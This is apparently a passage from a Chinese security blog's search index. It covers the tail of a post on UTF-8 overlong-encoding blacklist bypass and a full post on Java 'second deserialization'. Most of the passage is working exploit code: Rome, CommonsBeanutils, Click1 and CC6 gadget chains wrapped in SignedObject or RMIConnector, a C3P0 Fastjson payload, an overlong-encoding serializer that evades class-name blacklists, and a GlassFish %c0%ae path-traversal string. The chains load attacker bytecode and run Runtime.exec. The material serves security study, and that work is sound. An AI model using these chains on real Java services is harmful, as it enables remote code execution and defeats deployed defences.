(!text.contains(&quot;org.zIxyd.Calc&quot;)) { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(byteArray)); ois.readObject(); }else{ System.out.println(&quot;Hacker!!!&quot;); } } public static byte[] hexStringToByteArray(String hexString) { int len = hexString.length(); byte[] data = new byte[len / 2]; for (int i = 0; i &lt; len; i += 2) { data[i / 2] = (byte) ((Character.digit(hexString.charAt(i), 16) &lt;&lt; 4) + Character.digit(hexString.charAt(i+1), 16)); } return data; }}/*输出为：转换后的字符串为：�� \u0005sr \u000f��rg.zIxyd.Calc��T��H)|\u0002 \u0001L \u0003cmdt \u0012Ljava/lang/String;xpt \u0004calc*/ 可以看到o字符已经被混淆了；所以绕过了黑名单 Tools漏洞分析完了；但是可以想到手动修改ClassName的字节太过麻烦；师傅们用的办法都是重写writeClassDescriptor方法，再加上将类名Overlong Encoding的逻辑(具体思路可以看看lzstar师傅) 然后看了一下评论，说重写writeUTF相比之下简单一点(确实简单不少);所以就有了下面这段代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283import java.io.IOException;import java.io.ObjectOutputStream;import java.io.OutputStream;import java.util.HashMap;public class OverlongExp extends ObjectOutputStream { private static HashMap&lt;Character, int[]&gt; map; static { map = new HashMap&lt;&gt;(); map.put('.', new int[]{0xc0, 0xae}); map.put(';', new int[]{0xc0, 0xbb}); map.put('$', new int[]{0xc0, 0xa4}); map.put('[', new int[]{0xc1, 0x9b}); map.put(']', new int[]{0xc1, 0x9d}); map.put('a', new int[]{0xc1, 0xa1}); map.put('b', new int[]{0xc1, 0xa2}); map.put('c', new int[]{0xc1, 0xa3}); map.put('d', new int[]{0xc1, 0xa4}); map.put('e', new int[]{0xc1, 0xa5}); map.put('f', new int[]{0xc1, 0xa6}); map.put('g', new int[]{0xc1, 0xa7}); map.put('h', new int[]{0xc1, 0xa8}); map.put('i', new int[]{0xc1, 0xa9}); map.put('j', new int[]{0xc1, 0xaa}); map.put('k', new int[]{0xc1, 0xab}); map.put('l', new int[]{0xc1, 0xac}); map.put('m', new int[]{0xc1, 0xad}); map.put('n', new int[]{0xc1, 0xae}); map.put('o', new int[]{0xc1, 0xaf}); map.put('p', new int[]{0xc1, 0xb0}); map.put('q', new int[]{0xc1, 0xb1}); map.put('r', new int[]{0xc1, 0xb2}); map.put('s', new int[]{0xc1, 0xb3}); map.put('t', new int[]{0xc1, 0xb4}); map.put('u', new int[]{0xc1, 0xb5}); map.put('v', new int[]{0xc1, 0xb6}); map.put('w', new int[]{0xc1, 0xb7}); map.put('x', new int[]{0xc1, 0xb8}); map.put('y', new int[]{0xc1, 0xb9}); map.put('z', new int[]{0xc1, 0xba}); map.put('A', new int[]{0xc1, 0x81}); map.put('B', new int[]{0xc1, 0x82}); map.put('C', new int[]{0xc1, 0x83}); map.put('D', new int[]{0xc1, 0x84}); map.put('E', new int[]{0xc1, 0x85}); map.put('F', new int[]{0xc1, 0x86}); map.put('G', new int[]{0xc1, 0x87}); map.put('H', new int[]{0xc1, 0x88}); map.put('I', new int[]{0xc1, 0x89}); map.put('J', new int[]{0xc1, 0x8a}); map.put('K', new int[]{0xc1, 0x8b}); map.put('L', new int[]{0xc1, 0x8c}); map.put('M', new int[]{0xc1, 0x8d}); map.put('N', new int[]{0xc1, 0x8e}); map.put('O', new int[]{0xc1, 0x8f}); map.put('P', new int[]{0xc1, 0x90}); map.put('Q', new int[]{0xc1, 0x91}); map.put('R', new int[]{0xc1, 0x92}); map.put('S', new int[]{0xc1, 0x93}); map.put('T', new int[]{0xc1, 0x94}); map.put('U', new int[]{0xc1, 0x95}); map.put('V', new int[]{0xc1, 0x96}); map.put('W', new int[]{0xc1, 0x97}); map.put('X', new int[]{0xc1, 0x98}); map.put('Y', new int[]{0xc1, 0x99}); map.put('Z', new int[]{0xc1, 0x9a}); } public OverlongExp(OutputStream out) throws IOException { super(out); } public void writeUTF(String str) throws IOException { writeShort(str.length() * 2); for (int i = 0; i &lt; str.length(); i++) { int[] bs = map.get(str.charAt(i)); super.write(bs[0]); super.write(bs[1]); } }} 对比一下混淆之前和混淆之后的CC5 总结Overlong Encoding导致的安全问题不止局限于java反序列化中，例如：GlassFish在解码URL时，没有考虑UTF-8 Overlong Encoding攻击，导致将%c0%ae解析为ASCCII字符的.（点）。利用%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/来向上跳转，达到目录穿越、任意文件读取的效果。","link":"/2024/03/19/UTF-8%20Overlong%20Encoding/"},{"title":"Java二次反序列化漏洞","text":"前言在学习FastJson低版本漏洞时，机器不出网时，可以利用C3P0二次反序列化打内存马；之前就听说过Java二次反序化，但是一直不知道是啥；正好可以学习一波； 参考@Poria师傅 简单介绍众所周知，com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类乃万恶之源(类加载)，很多利用链最后都是利用了它；如果此类在黑名单了该怎么办？ 在某些情况下，就可以利用二次反序列化绕过黑名单； 简单介绍下二次反序列化，顾名思义，就是反序列化两次，其主要意义在于绕过黑名单的限制或不出网利用或者绕过一些loadClass()不能够加载数组的问题； 利用方法SignedObjectjava.security下的一个类； 其构造方法会将第一个参数序列化，然后赋值给content属性，SignedObject的getObject方法会将content属性反序列化 利用方式如下：先构造一个恶意SignedObject，然后调用它的getObject()方法即可 1234KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;);kpg.initialize(1024);KeyPair kp = kpg.generateKeyPair();SignedObject signedObject = new SignedObject(恶意对象 用于第二次反序列化, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;)); 利用思路: 谁的方法调用了getObject方法，然后一直往上跟readobject或者getter方法 谁的反射可控，直接进行反射调用 而Rome和CB中是可以调用某个类的getters方法的， Rome注意：我重写了resolveClass方法，方便看在第一次反序列化时使用了那些类名 1234567891011121314151617import java.io.IOException;import java.io.InputStream;import java.io.ObjectInputStream;import java.io.ObjectStreamClass;public class MyObjectInputStream extends ObjectInputStream{ public MyObjectInputStream(InputStream in) throws IOException { super(in); } @Override protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { System.out.println(desc.getName()); return super.resolveClass(desc); }} 众所周知Rome有两条，既可以用HashCode也可以用equals； 我这里以HashCode为例：看着很长，其实就是在之前的对象上套了一层SignedObject而已 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import org.apache.commons.collections.functors.ConstantTransformer;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.security.KeyPair;import java.security.KeyPairGenerator;import java.security.Signature;import java.security.SignedObject;import java.util.HashMap;public class RomeHashCode { public static void main(String[] args) throws Exception { TemplatesImpl fakeTemplates = new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(&quot;E:/tmp/Calc.class&quot;)); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,&quot;_name&quot;,&quot;zIxyd&quot;); setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]{code}); HashMap hashMap1 = getpayload(Templates.class, fakeTemplates,templates); KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap1, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;)); SignedObject dsa = new SignedObject(new ConstantTransformer(1), kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;)); HashMap hashMap2 = getpayload(SignedObject.class, dsa,signedObject); serialize(hashMap2); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new MyObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); } public static void setFieldValue(Object object,String field,Object value) throws NoSuchFieldException, IllegalAccessException { Field declaredField = object.getClass().getDeclaredField(field); declaredField.setAccessible(true); declaredField.set(object,value); } public static HashMap getpayload(Class clazz, Object flaseObject,Object trueObject) throws Exception { //rome链的关键 ToStringBean toStringBean = new ToStringBean(clazz, flaseObject); EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(equalsBean,1); //防止序列化时命令执行 Class toStringBeanClass = toStringBean.getClass(); Field object = toStringBeanClass.getDeclaredField(&quot;_obj&quot;); object.setAccessible(true); object.set(toStringBean,trueObject); return hashMap; }} 可以看到，成功绕过com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; CB因为CB链也是可以调用某个类的getters方法的，所以也可以通过SignedObject.getObject()来二次反序列化 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.beanutils.BeanComparator;import org.apache.commons.collections.comparators.TransformingComparator;import org.apache.commons.collections.functors.ConstantTransformer;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.security.KeyPair;import java.security.KeyPairGenerator;import java.security.Signature;import java.security.SignedObject;import java.util.PriorityQueue;public class CB { public static void main(String[] args) throws Exception { TemplatesImpl fakeTemplates = new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(&quot;E:/tmp/Calc.class&quot;)); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_name&quot;, &quot;zIxyd&quot;); setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{code}); PriorityQueue priorityQueue1 = getPayload(templates, &quot;outputProperties&quot;); KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(priorityQueue1, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;)); PriorityQueue priorityQueue2 = getPayload(signedObject, &quot;object&quot;); serialize(priorityQueue2); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;cc.bin&quot;)); oos.writeObject(obj); oos.close(); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new MyObjectInputStream(new FileInputStream(&quot;cc.bin&quot;)); ois.readObject(); ois.close(); } public static void setFieldValue(Object object, String field, Object value) throws Exception { Field declaredField = object.getClass().getDeclaredField(field); declaredField.setAccessible(true); declaredField.set(object, value); } public static PriorityQueue getPayload(Object object, String string) throws NoSuchFieldException, IllegalAccessException { BeanComparator beanComparator = new BeanComparator(string); //防止序列化时调用; TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(object); priorityQueue.add(2); Class c = priorityQueue.getClass(); Field comparator = c.getDeclaredField(&quot;comparator&quot;); comparator.setAccessible(true); comparator.set(priorityQueue, beanComparator); return priorityQueue; }} Click1因为Click1链也是可以调用某个类的getters方法的，所以也可以通过SignedObject.getObject()来二次反序列化 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980import java.io.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.click.control.Column;import org.apache.click.control.Table;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.security.KeyPair;import java.security.KeyPairGenerator;import java.security.Signature;import java.security.SignedObject;import java.util.Comparator;import java.util.PriorityQueue;public class Click1 { public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(&quot;E:/tmp/Calc.class&quot;)); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{code}); setFieldValue(templates, &quot;_name&quot;, &quot;Poria&quot;); setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); PriorityQueue priorityQueue = getPayload(templates, &quot;outputProperties&quot;); KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(priorityQueue, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;)); PriorityQueue priorityQueue2 = getPayload(signedObject, &quot;object&quot;); serialize(priorityQueue2); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new MyObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); } public static void setFieldValue(Object object, String field, Object value) throws NoSuchFieldException, IllegalAccessException { Field declaredField = object.getClass().getDeclaredField(field); declaredField.setAccessible(true); declaredField.set(object, value); } public static PriorityQueue getPayload(Object object, String string) throws Exception { Column column = new Column(string); //防止空指针异常 column.setTable(new Table()); Class clazz = Class.forName(&quot;org.apache.click.control.Column$ColumnComparator&quot;); Constructor declaredConstructor = clazz.getDeclaredConstructor(Column.class); declaredConstructor.setAccessible(true); Comparator comparator = (Comparator) declaredConstructor.newInstance(column); //先填垃圾数据，防止反序列化时就调用，后面在通过反射改回来 PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(1); priorityQueue.add(1); priorityQueue.add(2); //通过反射将垃圾数据改成恶意数据 Field field = PriorityQueue.class.getDeclaredField(&quot;queue&quot;); field.setAccessible(true); Object[] objects = (Object[]) field.get(priorityQueue); objects[0] = object; Field comparatorField = priorityQueue.getClass().getDeclaredField(&quot;comparator&quot;); comparatorField.setAccessible(true); comparatorField.set(priorityQueue, comparator); return priorityQueue; }} RMIConnectorjavax.management下一个与远程 rmi 连接器的连接类 最终在javax.management.RMIConnector#findRMIServerJRMP找到二次反序列化利用点; 给出二次反序列化的gadget 123javax.management.RMIConnector#connectjavax.management.RMIConnector#findRMIServerjavax.management.RMIConnector#findRMIServerJRMP 到此，这个利用方法就通了，给出构造 123JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://&quot;);setFieldValue(jmxServiceURL, &quot;urlPath&quot;, &quot;/stub/base64string&quot;);RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null) 利用思路: 谁的方法调用了connect方法并且传入的值可控 谁的反射可控，直接进行反射调用 师傅们给出的方法是通过InvokerTransformer类，反射调用了connect方法； (个人感觉有点鸡肋啊，InvokerTransformer这个类本身就很有可能在黑名单中，即使没有在黑名单中，为啥不直接反射调用SignedObject.getObject()呢？，而且CC在3.2.2版本中 InvokerTransformer就用不了了) CC6给出CC6的示例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.remote.JMXServiceURL;import javax.management.remote.rmi.RMIConnector;import java.io.*;import java.lang.reflect.Field;import java.security.KeyPair;import java.security.KeyPairGenerator;import java.security.Signature;import java.security.SignedObject;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class CC6Test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); //得到要执行命令的HashMap对象 HashMap hashMap = getPayload(chainedTransformer,&quot;deafbeef&quot;); //将要执行命令的HashMap对象序列化之后变成Base64数据 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream); oos.writeObject(hashMap); oos.close(); byte[] serializedObject = byteArrayOutputStream.toByteArray(); String base64Encoded = Base64.getEncoder().encodeToString(serializedObject); System.out.println(&quot;Base64 Encoded String: &quot; + base64Encoded);// 开始二次序列化操作 JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://&quot;); setFieldValue(jmxServiceURL, &quot;urlPath&quot;, &quot;/stub/&quot;+base64Encoded); RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null); //利用InvokerTransformer反射调用 RMIConnector.connect方法 InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;connect&quot;, null, null);// 最终 HashMap hashMap2 = getPayload(invokerTransformer,rmiConnector); //============= 也可以用 SignedObject 二次反序列化 ======================// KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;);// kpg.initialize(1024);// KeyPair kp = kpg.generateKeyPair();// SignedObject signedObject = new SignedObject(hashMap, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;));// InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;getObject&quot;, null, null);//// HashMap hashMap2 = getPayload(invokerTransformer,signedObject); serialize(hashMap2); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new MyObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); } public static void setFieldValue(Object object, String field, Object value) throws NoSuchFieldException, IllegalAccessException { Field declaredField = object.getClass().getDeclaredField(field); declaredField.setAccessible(true); declaredField.set(object, value); } public static HashMap getPayload(Object object,Object hackObject) throws Exception { HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap, (Transformer) object); TiedMapEntry tiedMapEntry = new TiedMapEntry(hashMap, hackObject); hashMap.put(tiedMapEntry, &quot;deadbeef&quot;); Class tiedMapEntryClass = TiedMapEntry.class; Field map = tiedMapEntryClass.getDeclaredField(&quot;map&quot;); map.setAccessible(true); map.set(tiedMapEntry, lazyMap); return hashMap; }} 可以明显看出很鸡肋，感觉最大的作用是来绕过一些loadClass()无法加载数组的情况； 列如： 反序列化默认是用的Class.forName 我这里重写resolveClass,改成用URLClassLoader.loadClass()去加载类 1234567891011121314151617181920212223242526272829import java.io.IOException;import java.io.InputStream;import java.io.ObjectInputStream;import java.io.ObjectStreamClass;import java.net.URL;import java.net.URLClassLoader;public class MyObjectInputStream extends ObjectInputStream{ private ClassLoader classLoader; public MyObjectInputStream(InputStream in) throws IOException { super(in); ClassLoader classLoader = ClassLoader.getSystemClassLoader(); if (classLoader != null) { URL[] urLs = ((URLClassLoader) classLoader).getURLs(); this.classLoader = new URLClassLoader(urLs); } else { System.out.println(&quot;error!!!&quot;); } } @Override protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { System.out.println(desc.getName()); Class&lt;?&gt; clazz = this.classLoader.loadClass(desc.getName()); return clazz; }} 这就和shiro550漏洞很像，不能加载Transformer数组；网上有一种对应方法：可以将CC6之类的链改成可以不用Transformer数组；但是我这里甚至不能加载byte数组；只能用二次反序列化绕过 参考[TCTF 2021]buggyLoader; Java安全——JVM类加载器 WrapperConnectionPoolDataSourcecom.mchange.v2.c3p0下的一个类，所以需要c3p0依赖 12345&lt;dependency&gt; &lt;groupId&gt;com.mchange&lt;/groupId&gt; &lt;artifactId&gt;c3p0&lt;/artifactId&gt; &lt;version&gt;0.9.5.2&lt;/version&gt;&lt;/dependency&gt; 最终在com.mchange.v2.ser.SerializableUtils#deserializeFromByteArray找到二次反序列化利用点; 给出二次反序列化的gadget 1234com.mchange.v2.c3p0.WrapperConnectionPoolDataSource#setUpPropertyListenerscom.mchange.v2.c3p0.impl.C3P0ImplUtils#parseUserOverridesAsStringcom.mchange.v2.ser.SerializableUtils#fromByteArray(byte[])com.mchange.v2.ser.SerializableUtils#deserializeFromByteArray 如图所示： 其中有一个判断语句，当其属性为userOverridesAsString时，将调用parseUserOverridesAsString方法 截取HexAsciiSerializedMap之后的内容，进入到fromByteArray 最后进入到deserializeFromByteArray中，进行二次反序列化 该链通常配合Fastjson、Jackson环境下不出网利用的打法； 12345678910{ &quot;rand1&quot;: { &quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot; }, &quot;rand2&quot;: { &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;, &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:hexstring;&quot;, }} 可以打FastJson原生反序列化漏洞,而无需CC等依赖；参考@y4tacker师傅 C3P012345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONArray;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;public class C3p0 { public static void main(String[] args) throws Exception { byte[] fastJsonPayload = getFastJsonPayload(); String hexstring = bytesToHex(fastJsonPayload); String FJ1247 = &quot;{\\n&quot; + &quot; \\&quot;rand1\\&quot;: {\\n&quot; + &quot; \\&quot;@type\\&quot;: \\&quot;java.lang.Class\\&quot;,\\n&quot; + &quot; \\&quot;val\\&quot;: \\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\&quot;\\n&quot; + &quot; },\\n&quot; + &quot; \\&quot;rand2\\&quot;: {\\n&quot; + &quot; \\&quot;@type\\&quot;: \\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\&quot;,\\n&quot; + &quot; \\&quot;userOverridesAsString\\&quot;: \\&quot;HexAsciiSerializedMap:&quot; + hexstring + &quot;;\\&quot;,\\n&quot; + &quot; }\\n&quot; + &quot;}&quot;; JSON.parseObject(FJ1247); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;cc.bin&quot;)); oos.writeObject(obj); oos.close(); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new MyObjectInputStream(new FileInputStream(&quot;cc.bin&quot;)); ois.readObject(); ois.close(); } public static void setFieldValue(Object object, String field, Object value) throws Exception { Field declaredField = object.getClass().getDeclaredField(field); declaredField.setAccessible(true); declaredField.set(object, value); } public static String bytesToHex(byte[] bytes) { StringBuffer stringBuffer = new StringBuffer(); for (int i = 0; i &lt; bytes.length; i++) { String hex = Integer.toHexString(bytes[i] &amp; 0xff); if (hex.length()&lt;2){ stringBuffer.append(&quot;0&quot; + hex); }else { stringBuffer.append(hex); } } return stringBuffer.toString(); } public static byte[] getFastJsonPayload() throws Exception { byte[] code = Files.readAllBytes(Paths.get(&quot;E:/tmp/Calc.class&quot;)); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_name&quot;, &quot;zIxyd&quot;); setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{code}); setFieldValue(templates, &quot;_tfactory&quot;, null); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException bd = new BadAttributeValueExpException(null); setFieldValue(bd,&quot;val&quot;,jsonArray); HashMap hashMap = new HashMap(); hashMap.put(templates,bd); ByteArrayOutputStream bao = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bao); oos.writeObject(hashMap); return bao.toByteArray(); }} 需要注意fastjon版本&lt;=1.2.47; 总结Java二次反序列化意义在于绕过黑名单的限制或不出网利用或者绕过一些loadClass()不能够加载数组的问题； 由于RMIConnector过于鸡肋；常用的利用链是SignedObject这条链；利用方式是看是否有利用链可以调用getters方法 WrapperConnectionPoolDataSource这条链需要找到某条利用链可以调用setters方法，所以经常配合Fastjson、Jackson环境下不出网利用","link":"/2024/03/21/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"unSerialize","slug":"unSerialize","link":"/tags/unSerialize/"},{"name":"Network","slug":"Network","link":"/tags/Network/"},{"name":"XXE","slug":"XXE","link":"/tags/XXE/"},{"name":"SSTI","slug":"SSTI","link":"/tags/SSTI/"},{"name":"HTB","slug":"HTB","link":"/tags/HTB/"},{"name":"include","slug":"include","link":"/tags/include/"},{"name":"writeup","slug":"writeup","link":"/tags/writeup/"},{"name":"upload","slug":"upload","link":"/tags/upload/"},{"name":"SSRF","slug":"SSRF","link":"/tags/SSRF/"},{"name":"RCE","slug":"RCE","link":"/tags/RCE/"},{"name":"pollution","slug":"pollution","link":"/tags/pollution/"},{"name":"python","slug":"python","link":"/tags/python/"}],"categories":[]}